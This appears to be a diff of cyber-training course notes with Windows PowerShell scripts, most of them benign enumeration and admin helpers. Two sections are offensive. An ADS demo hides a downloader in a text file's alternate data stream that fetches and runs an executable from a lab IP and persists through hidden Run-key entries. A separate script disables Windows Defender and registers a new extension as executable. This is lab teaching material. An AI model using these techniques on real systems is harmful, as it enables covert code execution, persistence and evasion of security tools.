@@ -68,3 +68,739 @@ NOGO ]
   Names are okay for the files and binaries, dll and stuff
   NOT looking at drivers, dll, binaries, handles
     
+COMMANDS 
+gwmi win32_service | where { $_.name -like "adws" -or $_.name -like "kdc" -or $_.name -like "netlogon" -or $_.name -like "dns" } | select name,state,status
+https://www.baeldung.com/linux/jq-command-json
+https://docs.jsonata.org/simple
+gci 'C:\$Recycle.Bin' -Force -Recurse | ForEach-Object { if (($_.extension) -like ".txt") { if ($_.Name -like "`$R*") { Write-Host $_.Name -NoNewline ; Write-host " --> " -ForegroundColor Green -NoNewline ; get-content $_.fullname }}}
+gci 'C:\$Recycle.Bin' -Force -Recurse | ForEach-Object { if (($_.extension) -like ".txt") { if ($_.Name -like "`$R*") { Write-Host $_.Name -NoNewline ; Write-host " --> " -ForegroundColor Green -NoNewline ; get-content $_.fullname }}}
+https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html
+Useful Info for OS Module
+OS Public Repository
+https://os.cybbh.io/public/os/latest/index.html
+OS CTFd Server
+http://10.50.22.25:8000/
+RDP from in-class network
+xfreerdp /u:<username> /v:<IP_Address> /dynamic-resolution +glyph-cache +clipboard
+RDP from Windows Ops Station/Windows PC
+mstsc.exe /v:<IP_Address> /admin /fullscreen
+                         -OR-
+Utilize 'Remote Desktop Connection' GUI
+SSH from in-class network
+ssh -X <username>@<IP_Address>
+SCP from local to remote
+scp <file_location> <username_of_remote>@<IP_Address_of_Remote>:<full_path_to_destination>
+SCP from remote to local
+scp <username_of_remote>@<IP_Address_of_Remote>:<full_path_to_location> <file_destination>
+
+=========================================================================================================
+ADS_DEMO
+<#
+###Pre-Requisites to be performed on Linux OpsStation
+
+#Creating the Payload Directory
+sudo mkdir /payloads
+
+#Modding permission on payload directory
+sudo chmod 777 /payloads
+
+#Adding the payload (calc.exe) and modifying its permissions
+scp <Windows_IP>:/C:/Windows/System32/calc.exe /payloads/
+chmod 777 /payloads/calc.exe
+
+#move to root drive
+cd /
+
+#Starting HTTP Server on Port 8000
+python2 -m SimpleHTTPServer 8000
+
+#Replace with Linux IP via Find and Replace
+ex: <Linux_IP> -> 127.0.0.1
+#>
+
+#On Windows OpsStation or  Admin-Station 
+
+#Creating a normal file with data
+Set-Content -Path C:\Users\student\Desktop\notes.txt -Value "You can change directories in a CommandPrompt or PowerShell terminal by utilizing the command 'cd'"
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "The command 'cd' stands for Change Directory."
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "`*My mind is blown away by this revalation"
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "`*Being a sysadmin is complicated if i have to keep up this amount of knowledge"
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "`* `#L33t_H@x0r"
+
+<#
+###SCENARIO###
+*You are a malicious Cyber Threat Actor (CTA), and have just gained access to a Windows asset.
+*You have already performed a Priviledge Esculation (PrivEsc) on the machine and have Admin Creds.
+*Base on Open Source Intelligence (OSINT) Recon, you have determined that the SysAdmins of the network are not of the utmost quality.
+*They're internal security seems to be on point, however you noticed that they heavily utilize Alternate Data Streams (ADS) on their domain for administrative purposes.
+*You have noticed that the Notes.txt file in Student's Desktop is a prime location for installing your ADS.
+*For the mission to be successfull, you will have to create an ADS along with a persistance mechanism to execute what's in the ADS.
+#>
+
+#View the newly created Notes file
+Get-Content -Path C:\Users\student\Desktop\notes.txt
+Get-FileHash -Path C:\Users\student\Desktop\notes.txt -Algorithm MD5
+
+#Adding an ADS to the 'notes' file
+Add-Content -PassThru C:\Users\student\Desktop\notes.txt -Value 'wget 10.50.24.35:8080/calc.exe -outfile C:\Windows\Temp\calc.exe ' -Stream 'script'
+Add-Content -PassThru C:\Users\student\Desktop\notes.txt -Value 'sleep 5' -Stream 'script'
+Add-Content -PassThru C:\Users\student\Desktop\notes.txt -Value 'start-process C:\Windows\Temp\calc.exe' -Stream 'script'
+
+#View Notes File (again)
+Get-Content -Path C:\Users\student\Desktop\notes.txt
+Get-FileHash -Path C:\Users\student\Desktop\notes.txt -Algorithm MD5
+
+#View the ADS you created
+Get-Content -Path C:\Users\student\Desktop\notes.txt -Stream script
+
+#Create Persistence in Machine Run Key
+New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name Machine_ADS_Persists -PropertyType String -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -windowstyle hidden -noprofile -command "Get-content C:\Users\student\Desktop\notes.txt -Stream script | foreach { powershell -windowstyle hidden -noprofile $_ }"' -Force -ErrorAction SilentlyContinue
+
+#Create Persistence in Every User's Run Key
+New-ItemProperty -Path Registry::HKey_Users\*\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name User_ADS_Persists -PropertyType String -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -noprofile -command "Get-content C:\Users\student\Desktop\notes.txt -Stream script | foreach { powershell -windowstyle hidden -noprofile $_ }"' -Force -ErrorAction SilentlyContinue
+
+#Executing the information from the ADS
+Get-Content C:\Users\student\Desktop\notes.txt -Stream script | foreach { powershell -windowstyle hidden -noprofile $_ }
+
+=======================================END ADS DEMO=====================================================================
+===================================================================================================================
+BYPASS-WINDEFEND
+#[CmdletBinding()]
+$path = Get-Location
+$scriptName = $MyInvocation.MyCommand.Name
+$script= "$path\$scriptName"
+
+Clear-Host
+Write-Host -NoNewline "Running " ; Write-Host -ForegroundColor Green "$script"
+Write-Host -NoNewline "Checking PowerShell Session Privileges"
+sleep 1
+Write-Host -NoNewline "."
+sleep 1
+Write-Host -NoNewline "."
+sleep 1
+Write-Host -NoNewline "."
+Sleep 1
+
+function Priv-Check {
+
+    $sid = [security.principal.windowsidentity]::GetCurrent()
+    $privs = new-object System.Security.Principal.WindowsPrincipal($sid)
+    clear-host
+    if ($privs.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Write-Output $true
+        }
+    else {
+        Write-Output $false
+        }
+    }
+
+if (-not(Priv-Check)) {
+        Clear-Host
+        Write-Host 'CHECK YOUR PRIVILEGE!!!'
+        Write-Host -NoNewline 'Unable to run '; Write-Host -ForegroundColor Green $script
+        sleep 1
+        throw "Run this script with Elevated/Administrative Rights"
+        }
+else {
+        Clear-Host
+        Write-Host "You are in an elevated PowerShell Session"
+        Sleep 1
+    }
+
+if ((Get-MpPreference).DisableRealtimeMonitoring -eq $false) {
+    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
+    New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+}
+
+if ((Get-MpPreference).DisableRealtimeMonitoring -eq $false) {
+    throw "Unable to Disable Windows Defender RealTimeMonitoring"
+}
+
+
+function Bypass-WinDef {
+    do {
+    $extension = Read-Host -Prompt "Enter the File Extension you want to add and omit the precluding '.'(Ex: gotcha -> .gotcha)"
+    } Until (![string]::IsNullOrWhiteSpace($extension))
+
+    New-Item "hklm:\software\classes" -Name ".$extension" -Force -ErrorAction SilentlyContinue | Out-Null 
+    New-ItemProperty "hklm:\software\classes\.$extension" -Name '(Default)' -PropertyType String -Value 'exefile' -Force -ErrorAction SilentlyContinue | Out-Null
+    New-ItemProperty "hklm:\software\classes\.$extension" -Name 'Content Type' -PropertyType String -Value 'application/x-msdownload' -Force -ErrorAction SilentlyContinue | Out-Null
+    Get-Item "HKLM:\Software\Classes\.$extension"
+}
+
+Bypass-WinDef
+====================================================================================ENDBYPASSWINDEFEND===============
+====================================================================================================================
+DEVICEINFO
+Function Enumerate-Device {
+
+    $ErrorActionPreference="SilentlyContinue"
+        #NOTE: Resets the Systems $ErrorActionPreference to SilentlyContinue in order to hide error messages in PS
+    Stop-Transcript -ErrorAction SilentlyContinue
+        #NOTE: Stops the OS from transcribing the contents of the rest of the function while hiding any error messages
+    Set-ExecutionPolicy Unrestricted -Force
+        #NOTE: Sets the Systems ExecutionPolicy to Unrestricted to allow you to run scripts and does not prompt for permission because of the -Force
+
+    Function Data-Results {
+        [string]$Directory = Read-Host -Prompt "Please Enter the Directory path of where you want the output text file to be placed"
+            if ( (Test-Path -Path $Directory) -eq $false ) {
+                Do {
+                    Write-Host "Directory does NOT exist!!!" -ForegroundColor Black -BackgroundColor Red
+                    $newDirectory = Read-Host -Prompt "Please Enter the Directory path of where you want the output text file to be placed"
+                    $Directory = "$newDirectory"
+                } Until ( (Test-Path -Path $newDirectory) -eq $true)
+            }
+        [string]$FileName = Read-Host -Prompt "Please Enter the name for the text file"
+        [string]$reply = Read-Host -Prompt "You have selected to write the file to $Directory\$FileName`.txt. Do you want to continue? [Yes/No]"
+            if ( $reply -notmatch "((^([yY]|[yY][eE][sS])$)|(^([nN]|[nN][oO])$))") {
+
+                Do {
+                    Write-Host "Incorrect Syntax" -ForegroundColor Black -BackgroundColor Red
+                    [string]$newreply = Read-Host -Prompt "You have selected to write the file to $Directory\$FileName`.txt. Do you want to continue? [Yes/No]"
+                    [string]$reply = "$newreply"
+                } Until ( $newreply -match "((^([yY]|[yY][eE][sS])$)|(^([nN]|[nN][oO])$))")
+            }
+            if ( $reply -match "((^[yY]$)|(^[yY][eE][sS]$))" ) { 
+                #Consent was given, it continues with the rest of the script
+            }            
+            else { 
+                #If consent was not given, it cancels and exits the script
+                Write-Host "Cancelling Script"
+         
+                #Progress Bar for cleanup
+                For ($i = 1; $i -lt 101; $i++ ) {
+                    Write-Progress -Activity "Performing Cleanup" -Status "$i% Complete" -PercentComplete $i -CurrentOperation "Reverting Changes and cleaning up a little"
+                    Start-Sleep -Milliseconds 33
+                }
+                Write-Progress -Activity "Cleanup Completed" -Completed
+                Break
+            }
+
+       #Writes the FullPath of the Output File 
+        Write-Output $Directory\$FileName`.txt   
+
+    }
+
+   #Saves the Output File Fullpath into a variable as a string so it can be utilized by 'Out-File' 
+    [string]$File_Output_Location= Data-Results
+
+    Function Enumeration {
+
+        $ProgressPreference="SilentlyContinue"
+            #NOTE: Sets the Systems $ProgressPreference variable to SilentlyContinue in order to hide progress bars in PS
+
+ 
+        Function CompInfo-Banner {
+            $Text_To_Underline="## Basic Computer Information ##"
+            $Underline='#'
+            $Text_Underline= $Underline * ($Text_To_Underline).Length
+            $Box= $Underline * ($Text_To_Underline).Length
+            $Banner=$Box, $Text_To_Underline, $Box      
+
+           #Data Output for the Function:
+            $Banner
+
+        }
+
+        Function Enumerate-CompInfo {  
+            $compinfo= Get-WmiObject Win32_ComputerSystem
+            $BIOSinfo= Get-WmiObject Win32_BIOS
+            $OSinfo= Get-WmiObject Win32_OperatingSystem
+            $Diskinfo= Get-WmiObject Win32_LogicalDisk
+            $date= get-date -UFormat "%B %d %Y %T %Z" 
+
+            $CompName= $compinfo.Name
+            $OS= $OSinfo.Caption
+            $Win10Build= Get-ComputerInfo  | Select-Object -ExpandProperty windowsversion
+            $OS_Ver= $OSinfo.Version
+            $BIOS_Manu= $BIOSinfo.Manufacturer
+
+            $SysInfo= New-Object -TypeName psobject
+
+            $SysInfo | Add-Member -MemberType NoteProperty -Name "Computername" -Value $CompName
+            $SysInfo | Add-Member -MemberType NoteProperty -Name "Operating System" -Value $OS
+            $SysInfo | Add-Member -MemberType NoteProperty -Name "  OS Version" -Value $Win10Build
+            $SysInfo | Add-Member -MemberType NoteProperty -Name "  Build Version" -Value $OS_Ver
+            $SysInfo | Add-Member -MemberType NoteProperty -Name "BIOS Manufacturer" -Value $BIOS_Manu
+
+           #Data Output for the Function:
+            Write-Output $date
+            $SysInfo
+            Write-Output "$null"
+        
+        }
+
+        Function StorageInfo-Banner {
+            $Text_To_Underline="## Attached Storage Drive(s) Information ##"
+            $Underline='#'
+            $Text_Underline= $Underline * ($Text_To_Underline).Length
+            $Box= $Underline * ($Text_To_Underline).Length
+            $Banner=$Box, $Text_To_Underline, $Box
+
+           #Data Output for the Function:
+            Write-Output "-The Drives listed are the Logical drives and not physical." 
+            Write-Output " *This means that each drive can have more than 1 Partition installed on it"
+            Write-Output " *If it does, then you will have multiple entries for 'Drive #'"
+            Write-Output "$null"
+
+        }
+
+        Function Enumerate-StorageInfo {
+
+            $CompDrives=Get-WmiObject Win32_LogicalDisk
+            $PartName=Get-WmiObject Win32_Volume
+            $DiskParts=$CompDrives | Select-Object -ExpandProperty DeviceID
+        
+            $count=1
+
+           #This Loop will create the Data Output for the Function absed upon how many iterations is required:         
+            ForEach ($partition in $DiskParts) {        
+                $DrivePath=$CompDrives | where { $_.PATH -like "*$partition*"} | Select-Object -ExpandProperty PATH
+                    #Note: You can also use the following $DrivePath=(Get-WmiObject Win32_LogicalDisk | Select-Object -expandProperty PATH).path | where { $_ -like "*$partition*"}
+                $DriveName=$PartName | where {$_.DriveLetter -like "*$partition"}  | Select-Object -ExpandProperty Label
+                $DriveParts=$CompDrives | where {$_.DeviceID -like "*$partition"} | Select-Object -ExpandProperty DeviceID
+
+                $StorageInfo= New-Object -TypeName psobject
+
+                $StorageInfo | Add-Member -MemberType NoteProperty -Name "Partition" -Value $partition\
+                $StorageInfo | Add-Member -MemberType NoteProperty -Name "Drive Name" -Value $DriveName
+                $StorageInfo | Add-Member -MemberType NoteProperty -Name "Drive Path" -Value $DrivePath
+
+               #Data Output for the Function:
+                Write-Output "Drive # $count"
+                $StorageInfo
+                $count+=1
+                Write-Output "$null"
+                       
+            }
+
+        }
+
+        Function NetInfo-Banner {
+            $Text_To_Underline="## Attached Network Adapter(s) ##"
+            $Underline='#'
+            $Text_Underline= $Underline * ($Text_To_Underline).Length
+            $Box= $Underline * ($Text_To_Underline).Length
+            $Banner=$Box, $Text_To_Underline, $Box
+            
+           #Data Output for the Function:            
+            $Banner
+            Write-Output "-If there is no entry for IPv6, that means it is not enabled"
+            Write-Output "  *Do NOT freak out if you see IPv6 on a DC or Mail Server as both servers utilize it for replication and automation tasks (hardcoded into OS)"
+            Write-Output "$null"
+
+        }
+  
+        Function Enumerate-NetInfo {
+
+            $IPv4regex= '^(?:25[0-5]|2[0-4]\d|[0-1]?\d{1,2})(?:\.(?:25[0-5]|2[0-4]\d|[0-1]?\d{1,2})){3}$'
+            $IPv6regex= '^(([0-9A-Fa-f]{1,4}:){7})([0-9A-Fa-f]{1,4})$|(([0-9A-Fa-f]{1,4}:){1,6}:)(([0-9A-Fa-f]{1,4}:){0,4})([0-9A-Fa-f]{1,4})$'
+            $AdapterInfo=Get-WmiObject Win32_NetworkAdapterConfiguration | Select-Object -ExpandProperty MACAddress     
+            $AdapterName=Get-WmiObject Win32_NetworkAdapterConfiguration | Select-Object -ExpandProperty Description
+            $NetName=Get-NetAdapter | Select-Object -ExpandProperty Name        
+            $count = 1
+            
+           #This Loop will create the Data Output for the Function absed upon how many iterations is required: 
+            ForEach ($name in $NetName) {
+
+                $NetInfo=Get-WmiObject Win32_NetworkAdapterConfiguration
+                $IPv4= $NetInfo | Select-Object -ExpandProperty IPAddress| Where-Object { $_ -match $IPv4regex}
+                $IPv6= $NetInfo | Select-Object -ExpandProperty IPAddress| Where-Object { $_ -match $IPv6regex}
+                $MAC= ($NetInfo | Select-Object -ExpandProperty MACAddress)
+                $Subnet= $NetInfo | Select-Object -ExpandProperty IPSubnet | Where-Object { $_ -match $IPv4regex}
+                $DGW=$NetInfo | Select-Object -ExpandProperty DefaultIPGateway | Where-Object { $_ -match $IPv4regex}
+                $type= Get-NetAdapter | where {$_.Name -match $name} |  Select-Object -ExpandProperty ifDesc
+                $PrintIPv6= 'if ($IPv6 -ne $null) { $IPv6 } else { N/A }'
+                $IPv6_Value= Invoke-Expression $PrintIPv6
+                $ArrayCounter= $count -1
+                $NetInfo= New-Object -TypeName psobject
+
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "Adapter Name" -Value $name
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "Adapter Type" -Value $type
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "MAC Address" -Value $MAC[$ArrayCounter]
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "IPv4 Address" -Value $IPv4[$ArrayCounter]
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "Subnet Mask" -Value $Subnet[$ArrayCounter]
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "Default Gateway" -Value $DGW
+                $NetInfo | Add-Member -MemberType NoteProperty -Name "IPv6 Address" -Value $IPv6_Value[$ArrayCounter]
+
+               #Data Output for the Function:
+                Write-Output "Adapter # $count" 
+                $NetInfo
+                $count +=1
+                Write-Output "$null"
+                        
+            }
+        }
+
+        Function Processes-Banner {
+            $Text_To_Underline="## Processes on $env:COMPUTERNAME ##"
+            $Underline='#'
+            $Text_Underline= $Underline * ($Text_To_Underline).Length
+            $Box= $Underline * ($Text_To_Underline).Length
+            $Banner=$Box, $Text_To_Underline, $Box
+        
+           #Data Output for the Function:
+            $Banner
+            Write-Output "-Processes have been sorted by their ParentProcessID (PPID) first then and by thier ProcessID (PID)"
+        }
+  
+        Function Enumerate-Processes {
+            
+           #Data Output for the Function:
+            Get-WmiObject win32_process | Select-Object -Property Name, ProcessID, ParentProcessID, Path, Commandline | sort -Property @{Expression = "ParentProcessID"; Ascending = $true }, @{ Expression = "ProcessID"; Ascending = $true } | Format-Table -Property Name, ProcessID, ParentProcessID, Path, Commandline -AutoSize
+
+        }
+
+       #Calling All the Sub-Functions in order to get the data and display it
+        Write-Output "$null"
+        CompInfo-Banner
+        Enumerate-CompInfo   
+        StorageInfo-Banner
+        Enumerate-StorageInfo
+        NetInfo-Banner
+        Enumerate-NetInfo
+        Processes-Banner
+        Enumerate-Processes
+
+        $ProgressPreference="Continue"
+            #NOTE: Resets the Systems $ProgressPreference variable back to Continue in order to display progress bars in PS
+    }
+
+   #Runs the Enumeration function then writes it to the file specified by $File_Output_Location
+    Enumeration | Out-File (Write-Output $File_Output_Location)
+
+    Set-ExecutionPolicy RemoteSigned -Force
+        #NOTE: Sets the Systems ExecutionPolicy to RemoteSigned and does not prompt for permission because of the -Force
+
+    $ErrorActionPreference="Continue"
+        #NOTE: Resets the Systems $ErrorActionPreference to Continue in order to display error messages in PS
+
+}
+
+#Runs the Function 'Enumerate-Device' which will then write it to a file
+Enumerate-Device
+
+#Progress Bar for cleanup
+For ($i = 1; $i -lt 10; $i++ ) {
+    Write-Progress -Activity "Performing Cleanup" -Status "$i% Complete" -PercentComplete $i -CurrentOperation "Doing some cleaning"
+    Start-Sleep -Milliseconds 33
+}
+
+#Deletes the function 'Enumerate-Device'
+#Remove-Item function:Enumerate-Device
+
+For ($i = 10; $i -lt 101; $i++ ) {
+    Write-Progress -Activity "Performing Cleanup" -Status "$i% Complete" -PercentComplete $i -CurrentOperation "Doing some cleaning"
+    Start-Sleep -Milliseconds 33
+}
+Write-Progress -Activity "Cleanup Completed" -Completed
+====================================================================END DEVICE INFO===========================================
+=======================================================================================================================
+GET DHCP SERVICE DESC
+Function pause ($message)
+{
+    # Check if running Powershell ISE
+    if ($psISE)
+    {
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.MessageBox]::Show("$message")
+    }
+    else
+    {
+        Write-Host "$message" -ForegroundColor Gray -BackgroundColor Red
+        $x = $host.ui.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    }
+}
+
+Function cmd_pause ($message)
+{
+    # Check if running Powershell ISE
+    if ($psISE)
+    {
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.MessageBox]::Show("$message")
+    }
+    else
+    {
+        Write-Host "$message" -ForegroundColor Black -BackgroundColor Gray
+        $x = $host.ui.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    }
+}
+
+Clear-Host
+echo ""
+
+Write-Host "Pulling all Services" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-Service" -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-Service
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling all Services and all thier properties" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-Service | Select-Object -Property *" -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-Service | Select-Object -Property * 
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling only the DHCP Service and its properties" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-Service | Select-Object -Property * | Where-Object { `$_.Name -Like '*DHCP*' }" -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-Service | Select-Object -Property * | Where-Object { $_.Name -Like '*DHCP*' } 
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling all Services with WMI" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-WmiObject win32_service" -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-WmiObject win32_service 
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling all Services and all thier properties" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-WmiObject win32_service | Select-Object -Property *" -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-WmiObject win32_service | Select-Object -Property *
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling only the DHCP Service and its properties" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-WmiObject win32_service | Select-Object -Property * | Where-Object { `$_.Name -Like '*DHCP*' }" -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-WmiObject win32_service | Select-Object -Property * | Where-Object { $_.Name -Like '*DHCP*' } 
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling only the DHCP Service and selecting only the Name and Description properties" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-WmiObject win32_service | Select-Object -Property Name, Description | Where-Object { `$_.Name -Like '*DHCP*' } " -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-WmiObject win32_service | Select-Object -Property Name, Description | Where-Object { $_.Name -Like '*DHCP*' } 
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling only the DHCP Service formatting a table with the Name/Description" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-WmiObject win32_service | Select-Object -Property Name, Description | Where-Object { `$_.Name -Like '*DHCP*' } | Format-Table " -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-WmiObject win32_service | Select-Object -Property Name, Description | Where-Object { $_.Name -Like '*DHCP*' } | Format-Table
+
+
+echo ""
+pause "Press Any Key to Continue"
+Clear-Host
+echo ""
+echo ""
+
+Write-Host "Pulling only the DHCP Service formatting a table with the Name/Description being wrapped" -BackgroundColor Black -ForegroundColor Green
+Write-Host "Get-WmiObject win32_service | Select-Object -Property Name, Description | Where-Object { `$_.Name -Like '*DHCP*' } | Format-Table -Wrap " -ForegroundColor Yellow
+cmd_pause "Press any key to execute the command above"
+Get-WmiObject win32_service | Select-Object -Property Name, Description | Where-Object { $_.Name -Like '*DHCP*' } | Format-Table -Wrap
+
+pause "Press Any Key to Continue"
+Clear-Host
+=====================================================================ENDGETDHCP======================================
+=================================================================================================================
+GET SERVICE LOAD ORDER GROUP
+function Find-ServiceLoadOrderGroup {
+[CmdLetBinding()]
+param (
+    [Parameter(Mandatory=$True)]
+    [string]$ServiceName
+    )
+
+    do { 
+        if ([string]::IsNullOrWhiteSpace($ServiceName)) {
+            $ServiceName=read-host -prompt "Enter the Service Name"
+            }
+        }Until (! [string]::IsNullOrWhiteSpace($ServiceName))
+
+    $Name = Get-WmiObject Win32_Service | Select * | Where { $_.name -like "*$ServiceName*" } | Select -ExpandProperty Name
+    
+    if ([string]::IsNullOrWhiteSpace($Name)) {
+        $NewName = Get-WmiObject Win32_Service | Select * | Where { $_.Displayname -like "*$ServiceName*" } | Select -ExpandProperty Name
+        if ([string]::IsNullOrWhiteSpace($NewName)) {
+            throw "Service with a name/displayname of $ServiceName was not found"
+            }
+        else {
+        $name = $NewName
+            }
+    }
+
+    $GroupName = Get-WmiObject win32_loadordergroupservicemembers | where {$_.PartComponent -like "*$name*"} | select -ExpandProperty GroupComponent
+    
+    if ([string]::IsNullOrEmpty($GroupName)) {
+        Write-Host "The Service `'$Name`' does not require a LoadOrderGroup"
+    }
+    else {
+        $GroupName
+    }
+}   
+
+Find-ServiceLoadOrderGroup
+=========================================================================END GET SERVICE LOAD ORDER GROUP================
+===================================================================================================================
+GET SYSINTERNALS
+Clear-Host
+Write-Host -NoNewline "Checking PowerShell Session Privileges"
+sleep 1
+Write-Host -NoNewline " ."
+sleep 1
+Write-Host -NoNewline " ."
+sleep 1
+Write-Host -NoNewline " ."
+Sleep 1
+
+
+function Priv-Check {
+
+    $sid = [security.principal.windowsidentity]::GetCurrent()
+    $privs = new-object System.Security.Principal.WindowsPrincipal($sid)
+    clear-host
+    if ($privs.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Write-Output $true 
+        }
+    else {
+        Write-Output $false
+        }
+    }
+
+if (-not(Priv-Check)) {
+        Write-Host -BackgroundColor Black -ForegroundColor Red "CHECK YOUR PRIVILEGE!!!"
+        sleep 2
+        throw "Run this script with Elevated/Administrative Rights"
+        }
+
+Function SysInternals-Download {
+
+    $menu = New-Object -TypeName psobject
+    $menu | Add-Member -MemberType NoteProperty -Name 1 -Value "Net Use"
+    $menu | Add-Member -MemberType NoteProperty -Name 2 -Value "Add a New PSDrive"
+    $menu | Add-Member -MemberType NoteProperty -Name 3 -Value "Invoke WebRequest Download"
+    $menu | Add-Member -MemberType NoteProperty -Name 4 -Value "Invoke Webrequest Download and add to System Env Path"
+    $menu | Add-Member -MemberType NoteProperty -Name 5 -Value "Exit"
+
+    Clear-Host
+    Write-Host "Menu"
+    Write-Host "----------------------" -NoNewline
+    $menu
+
+    DO {
+                
+        [int]$Number = Read-Host -Prompt "Please Select how you want to get SysInternals"
+
+        if ( $Number -notmatch '^[1-5]$' ) {
+            
+            Clear-Host
+
+            Write-Host "Menu"
+            Write-Host "--------"
+            $menu
+           
+            Write-Host " Invalid Menu Option " -ForegroundColor Black -BackgroundColor Red -NoNewline
+            Write-Host " " -NoNewLine
+            }
+        } Until ($Number -match '^[1-5]$')
+
+    switch ($Number) {
+
+        1 {
+            Write-Host "Mapping SysInternals to a Temp Drive"
+            Write-Host -NoNewline "Utilized the command `"" ; Write-Host -NoNewline -ForegroundColor Green "net use * http://live.sysinternals.com" ; Write-Host -NoNewline "`""
+            Write-Host ""
+            net use * http://live.sysinternals.com
+        }
+        2 {
+            Write-Host "Creating a new PS Drive to live.sysinternals.com/tools"
+            Write-Host -NoNewline "Utilized the command `"" ; Write-Host -NoNewline -ForegroundColor Green 'New-PSDrive -Name "SysInt" -PSProvider FileSystem -Root "\\live.sysinternals.com\Tools' ; Write-Host -NoNewline "`""
+            Write-Host ""
+            New-PSDrive -Name "SysInt" -PSProvider FileSystem -Root "\\live.sysinternals.com\Tools"
+            Write-Host -NoNewline "Sysinternals is mapped to the drive" ; Write-Host -NoNewline -ForegroundColor Green " SysInt:\"
+            Write-Host $null    
+        }
+        3 {
+            Write-Host "Downloading SysInternals"
+            Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile $env:HOMEDRIVE\SysInternalsSuite.zip  
+            Expand-Archive $env:HOMEDRIVE\SysInternalsSuite.zip -DestinationPath $env:HOMEDRIVE\SysInternals -Force
+            Write-Host "Removing Temp Files"
+            Remove-item $env:HOMEDRIVE\SysInternalsSuite.zip 
+            Unblock-File $env:HOMEDRIVE\SysInternals\*
+            Write-Host -NoNewline "Sysinternals has been downloaded to directory " ; Write-Host -NoNewline -ForegroundColor Green "C:\SysInternals"
+            Write-Host $null
+        }        
+        4 {
+            Write-Host "Downloading SysInternals"
+            Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile $env:HOMEDRIVE\SysInternalsSuite.zip  
+            Expand-Archive $env:HOMEDRIVE\SysInternalsSuite.zip -DestinationPath $env:HOMEDRIVE\SysInternals -Force
+            Write-Host "Removing Temp Files"
+            Remove-item $env:HOMEDRIVE\SysInternalsSuite.zip 
+            Unblock-File $env:HOMEDRIVE\SysInternals\* 
+            Write-Host "Adding C:\SysInternals Directory to the Machine Environmental Path"
+            [Environment]::SetEnvironmentVariable("PATH", $env:Path + ";C:\SysInternals", 'Machine')
+            Write-Host "Reloading PowerShell's Environmental Variables"
+            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User") 
+            Write-Host -NoNewline "SysInternals has been Downloaded to "; Write-Host -NoNewline -ForegroundColor Green "C:\SysInternals" ; Write-Host -NoNewline " and has been added to the Machine's Environmental Path"
+            Write-Host $null
+        }
+        5 {
+            Write-Host "Good Bye"
+            break
+        }
+
+    }
+}
+
+SysInternals-Download
+
+Remove-Item function:Priv-Check
+Remove-Item function:SysInternals-Download
+==========================================================END GET SYSINTERNALS============================================
+===============================================================================================
+GET PS PROFILE CHECKER
+Function PSProfile-Checker {
+
+$Properties = $profile | get-member -MemberType NoteProperty | Select -ExpandProperty Name
+$Properties | ForEach-Object { if ((test-path $profile.$_) -eq $true) { Write-Host "`$Profile.$_ Exists" } } 
+
+}
+
+PSProfile-Checker
+Remove-Item function:PSProfile-Checker
+===================================================================END GET PS PROFILE CHECKER========================
+
+
+
